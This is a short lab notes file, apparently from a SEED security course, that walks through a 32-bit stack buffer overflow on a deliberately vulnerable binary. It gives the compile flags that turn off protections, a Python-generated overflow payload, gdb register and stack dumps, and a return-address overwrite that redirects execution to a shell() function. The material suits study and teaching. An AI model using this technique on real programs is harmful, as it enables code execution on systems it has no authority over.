@@ -1,0 +1,53 @@
+ggcc -m32 -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2 -w
+python -c "print('A'*128+'here')" > inputbof3 => create file input
+gdb bof3.out -q
+=> r < inputbof3
+[----------------------------------registers-----------------------------------]
+EAX: 0x65726568 ('here')
+EBX: 0x0
+ECX: 0x0
+EDX: 0xf7fca87c --> 0x0
+ESI: 0xf7fc9000 --> 0x1b2db0
+EDI: 0xf7fc9000 --> 0x1b2db0
+EBP: 0xffffd768 --> 0x0
+ESP: 0xffffd6e0 --> 0x80484b0 (<main+47>:       nop)
+EIP: 0x65726568 ('here')
+EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x65726568 ( yeah )
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd6e0 --> 0x80484b0 (<main+47>:      nop)
+0004| 0xffffd6e4 ('A' <repeats 128 times>, "here")
+0008| 0xffffd6e8 ('A' <repeats 124 times>, "here")
+0012| 0xffffd6ec ('A' <repeats 120 times>, "here")
+0016| 0xffffd6f0 ('A' <repeats 116 times>, "here")
+0020| 0xffffd6f4 ('A' <repeats 112 times>, "here")
+0024| 0xffffd6f8 ('A' <repeats 108 times>, "here")
+0028| 0xffffd6fc ('A' <repeats 104 times>, "here")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x65726568 in ?? ()
+
+
+=====================
+
+find address : 
+
+
+nm bof3.out | grep shell
+==> out put 
+seed@03a6a11aa9a8:~/seclabs/bof$ nm bof3.out | grep shell
+0804845b T shell
+swap in here:
+python -c "print('A'*128+'\x5b\x84\x04\x08')" > inputbof3 => create file input
+
+run again:
+==>
+gdb-peda$ r < inputbof3
+Starting program: /home/seed/seclabs/bof/bof3.out < inputbof3
+You made it! The shell() function is executed
+[Inferior 1 (process 41) exited with code 056]
+Warning: not running
+
+0x0804845b
